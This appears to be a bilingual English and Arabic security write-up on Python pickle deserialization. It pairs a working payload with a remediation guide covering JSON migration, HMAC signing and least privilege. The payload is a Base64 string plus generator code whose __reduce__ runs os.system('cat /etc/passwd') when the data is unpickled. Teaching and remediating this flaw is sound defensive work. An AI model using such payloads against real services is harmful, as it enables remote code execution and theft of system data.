# Comprehensive Exploitation Payloads: Python Insecure Deserialization

## Payload 1: Arbitrary Command Execution (Local File Disclosure)
**Vulnerability Type:** Insecure Deserialization (Python `pickle` module)
**Objective:** Execute OS-level commands to read the contents of `/etc/passwd`.

### 1. The Encoded Payload
This is the final Base64-encoded string that was injected into the vulnerable application:
```text
gASVKgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA9jYXQgL2V0Yy9wYXNzd2SUhZRSlC4=

#### 2. Payload Generation Source Code
To understand how the Base64 string was generated, here is the exact Python code used to craft the malicious object:

import pickle
import base64
import os

class Malicious:
    def __reduce__(self):
        # Instructs pickle to execute os.system("cat /etc/passwd") upon deserialization
        return (os.system, ("cat /etc/passwd",))

# Instantiate the malicious class
exploit_object = Malicious()

# Serialize the object into a byte stream
pickled_data = pickle.dumps(exploit_object)

# Encode the byte stream to Base64 for safe transmission
encoded_payload = base64.b64encode(pickled_data)
print(encoded_payload.decode())

3. Execution Breakdown (How the Payload Works)
The __reduce__ Method: In Python, the __reduce__ magic method allows a developer to define custom behavior for the object during the pickling process. It expects a tuple containing a callable (function) and its arguments.

The Callable (os.system): We passed os.system as the callable. This function passes the string argument directly to the underlying operating system's shell.

The Argument (cat /etc/passwd): This is the standard Linux command to output the contents of the user account information file.

The Trigger (pickle.loads): The attack remains dormant while serialized. The moment the target application receives this Base64 string, decodes it, and passes the bytes to pickle.loads(), the Python interpreter automatically reconstructs the object. During reconstruction, it evaluates the tuple defined in __reduce__, immediately triggering os.system("cat /etc/passwd").

حمولات الاستغلال الشاملة (Payloads)
البايلود الأول: تنفيذ أوامر عشوائية (قراءة ملف محلي)
نوع الثغرة: إلغاء التسلسل غير الآمن (عبر مكتبة pickle في بايثون)
الهدف: تنفيذ أوامر على مستوى نظام التشغيل لقراءة محتويات ملف /etc/passwd.

1. البايلود المشفر
هذا هو النص النهائي المشفر بصيغة Base64 والذي تم حقنه في التطبيق المصاب:
gASVKgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA9jYXQgL2V0Yy9wYXNzd2SUhZRSlC4=
2. الكود المصدري لتوليد البايلود
لفهم كيف تم توليد هذا النص المشفر، إليك كود بايثون الدقيق الذي استُخدم لصناعة الكائن الخبيث:
import pickle
import base64
import os

class Malicious:
    def __reduce__(self):
        # يوجه مكتبة pickle لتنفيذ هذا الأمر فوراً عند فك التسلسل
        return (os.system, ("cat /etc/passwd",))

# إنشاء نسخة من الفئة الخبيثة
exploit_object = Malicious()

# تحويل الكائن إلى سلسلة من البايتات (تسلسل)
pickled_data = pickle.dumps(exploit_object)

# تشفير البايتات بصيغة Base64 لضمان نقلها بأمان
encoded_payload = base64.b64encode(pickled_data)
print(encoded_payload.decode())
. تحليل التنفيذ (كيف يعمل البايلود)
الدالة __reduce__: تسمح هذه الدالة السحرية في بايثون للمبرمج بتعريف سلوك مخصص للكائن أثناء عملية التسلسل (Pickling). تتطلب الدالة إرجاع مجموعة (Tuple) تحتوي على كائن قابل للاستدعاء (دالة) ومُعاملاته (Arguments).

الكائن القابل للاستدعاء (os.system): قمنا بتمرير os.system كدالة. هذه الدالة تقوم بتمرير النص مباشرة إلى موجه الأوامر (Shell) الخاص بنظام التشغيل.

المُعامل (cat /etc/passwd): هذا هو أمر لينكس القياسي لطباعة محتويات ملف معلومات حسابات المستخدمين.

المُحفِّز للثغرة (pickle.loads): يظل الهجوم خاملاً طالما أنه متسلسل. بمجرد أن يستقبل التطبيق الهدف هذا النص المشفر، يفك تشفير Base64، ويمرر البايتات إلى دالة pickle.loads()، يقوم مترجم بايثون بإعادة بناء الكائن تلقائياً. أثناء إعادة البناء، يتم تقييم المجموعة المُعرفة في __reduce__، مما يؤدي فوراً إلى تفعيل os.system("cat /etc/passwd").
---

### 3. ملف `Fix.md` (توثيق طرق الحماية والترقيع بالتفصيل)
انسخ هذا الكود وضعه داخل ملف `Fix.md`:

```markdown
# Comprehensive Remediation Guide: Securing Python Deserialization

## The Golden Rule of Pickle
According to the official Python documentation: **"Never unpickle data received from an untrusted or unauthenticated source."** 
The `pickle` module is fundamentally incompatible with untrusted data. There is no configuration or strict filtering that can make `pickle.loads()` 100% safe against a determined attacker. Therefore, remediation relies on architectural changes.

## Remediation Strategy 1: Migrate to Safe Data Formats (Strongly Recommended)
The most permanent and robust fix is to completely remove the `pickle` module from the application's data exchange pathways. Instead of serializing complex Python objects (which include code and methods), applications should only serialize raw data (state) using safe, data-only formats.

### Safe Alternatives:
* **JSON (`json`):** The built-in JSON module parses only primitive data types (strings, numbers, lists, dictionaries, booleans). It cannot serialize or deserialize functions or classes, making RCE impossible.
* **MessagePack:** A binary serialization format that is faster and more compact than JSON, while remaining strictly a data format.

**Vulnerable Code (Before):**
```python
import pickle
# DANGEROUS: Executes arbitrary code if data is manipulated
user_data = pickle.loads(user_input_bytes)
Secure Code (After):
import json
# SECURE: Only parses standard data structures. Will crash safely on malicious code.
user_data = json.loads(user_input_string)
Remediation Strategy 2: Cryptographic Signatures (HMAC)
If migrating away from pickle is technically impossible due to legacy system constraints, the application must cryptographically guarantee that the serialized data was created by the server and has not been tampered with by an attacker.

This is achieved using a Hash-based Message Authentication Code (HMAC).

When the server generates the pickled data, it signs it using a secret key (known only to the server) and appends the signature to the payload.

When the server receives the data back from the client, it mathematically verifies the signature using the same secret key.

Crucial Step: The signature verification must happen before the data is passed to pickle.loads(). If the signature is invalid, the data is dropped, and deserialization never occurs.
Remediation Strategy 3: Principle of Least Privilege
While not a fix for the deserialization vulnerability itself, running the application with the least privileges necessary acts as a defense-in-depth measure.

Do not run the Python application as root or an Administrator.

Use containerization (like Docker) or sandboxing to restrict what the application can do on the host operating system. If an attacker achieves RCE, their blast radius is limited to the container.

الدليل الشامل للترقيع: تأمين عملية فك التسلسل في بايثون
القاعدة الذهبية لمكتبة Pickle
وفقاً للوثائق الرسمية للغة بايثون: "لا تقم أبداً بفك تسلسل بيانات واردة من مصدر غير موثوق أو غير مصادق عليه."
مكتبة pickle تتعارض أساساً مع البيانات غير الموثوقة. لا يوجد إعداد أو تصفية صارمة يمكن أن تجعل pickle.loads() آمنة بنسبة 100% ضد مهاجم مُصر. لذلك، يعتمد الترقيع على إجراء تغييرات هيكلية (Architectural).

استراتيجية الترقيع الأولى: الانتقال إلى صيغ بيانات آمنة (مُوصى به بشدة)
الحل الجذري والأكثر صلابة هو إزالة مكتبة pickle تماماً من مسارات تبادل البيانات في التطبيق. بدلاً من عمل تسلسل لكائنات بايثون المعقدة (والتي تشمل أكواد ودوال برمجية)، يجب على التطبيقات عمل تسلسل للبيانات الخام فقط (حالة البيانات) باستخدام صيغ مخصصة للبيانات فقط.

البدائل الآمنة:
صيغة JSON (json): تقوم مكتبة JSON المدمجة بتحليل أنواع البيانات الأساسية فقط (نصوص، أرقام، قوائم، قواميس، قيم منطقية). لا يمكنها عمل تسلسل أو فك تسلسل للدوال أو الكلاسات، مما يجعل تنفيذ الأوامر (RCE) مستحيلاً.

صيغة MessagePack: صيغة تسلسل ثنائية (Binary) أسرع وأصغر حجماً من JSON، وتظل بشكل صارم مجرد صيغة للبيانات.

الكود المصاب (قبل الترقيع):
import pickle
# خطير جداً: ينفذ أكواد عشوائية إذا تم التلاعب بالبيانات
user_data = pickle.loads(user_input_bytes)
الكود الآمن (بعد الترقيع):
import json
# آمن: يحلل هياكل البيانات القياسية فقط. سيتوقف بأمان إذا كان هناك كود خبيث.
user_data = json.loads(user_input_string)
ستراتيجية الترقيع الثانية: التوقيع التشفيري (HMAC)
إذا كان الاستغناء عن مكتبة pickle مستحيلاً تقنياً بسبب قيود الأنظمة القديمة (Legacy Systems)، يجب أن يضمن التطبيق تشفيرياً أن البيانات المتسلسلة تم إنشاؤها بواسطة الخادم ولم يتم التلاعب بها من قبل المهاجم.

يتم تحقيق ذلك باستخدام رمز مصادقة الرسائل المستند إلى التجزئة (HMAC).

عندما يولد الخادم بيانات متسلسلة (Pickled)، يقوم بتوقيعها باستخدام مفتاح سري (Secret Key) لا يعرفه سوى الخادم، ويرفق التوقيع مع البايلود.

عندما يتلقى الخادم البيانات مرة أخرى من العميل، فإنه يتحقق من التوقيع رياضياً باستخدام نفس المفتاح السري.

الخطوة الحاسمة: يجب أن تتم عملية التحقق من التوقيع قبل تمرير البيانات إلى pickle.loads(). إذا كان التوقيع غير صالح، يتم التخلص من البيانات ولا تحدث عملية فك التسلسل إطلاقاً.

استراتيجية الترقيع الثالثة: مبدأ الامتيازات الأقل
على الرغم من أن هذا ليس حلاً لثغرة فك التسلسل بحد ذاتها، إلا أن تشغيل التطبيق بأقل الصلاحيات اللازمة يُعد إجراءً دفاعياً متعمقاً (Defense-in-depth).

لا تقم بتشغيل تطبيق بايثون بصلاحيات الجذر (root) أو كمسؤول.

استخدم تقنيات الحاويات (مثل Docker) لتقييد ما يمكن للتطبيق فعله على نظام التشغيل المضيف. إذا تمكن المهاجم من تنفيذ أوامر (RCE)، فسيكون نطاق الضرر محدوداً داخل الحاوية فقط.

